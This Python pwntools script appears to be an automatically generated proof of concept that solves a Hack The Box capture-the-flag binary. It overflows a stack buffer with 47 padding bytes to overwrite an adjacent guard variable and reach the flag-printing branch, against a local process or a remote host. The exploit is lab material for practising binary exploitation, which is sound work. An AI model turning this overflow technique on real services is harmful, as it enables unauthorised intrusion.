#!/usr/bin/env python3
# Argus-generated variable-overwrite PoC scaffold
# Chain: chains.variable_overwrite
# Binary: /mnt/d/Repos/Security/Argus/vulntest/validation/htb/tracks/binary_exploitation/extracted/a12c7367-6b1d-4b51-b669-b845cdf5b9f8/challenge/el_pipo
#
# Payload overwrites an adjacent stack guard variable to satisfy its
# comparison check and trigger the privileged branch (e.g. read_flag).
# No RIP control is needed — the overflow is deliberate and bounded.
from pwn import *

context.arch = 'amd64'
context.log_level = 'warning'

fname = '/mnt/d/Repos/Security/Argus/vulntest/validation/htb/tracks/binary_exploitation/extracted/a12c7367-6b1d-4b51-b669-b845cdf5b9f8/challenge/el_pipo'

OVERWRITE_OFFSET = 47  # read() declared size = 64

def exploit(target):
    payload  = b'A' * OVERWRITE_OFFSET
    payload += p8(0x2)  # != 0x1 — triggers else/win branch of if (var == 0x1)
    target.sendlineafter(b'> ', payload)
    return target.recvall(timeout=3)

if __name__ == '__main__':
    import sys
    if len(sys.argv) >= 3:
        r = remote(sys.argv[1], int(sys.argv[2]))
    else:
        r = process(fname)
    out = exploit(r)
    flag = [l for l in out.decode(errors='replace').splitlines() if 'HTB' in l or 'flag' in l.lower()]
    print(flag[0] if flag else out[:200])
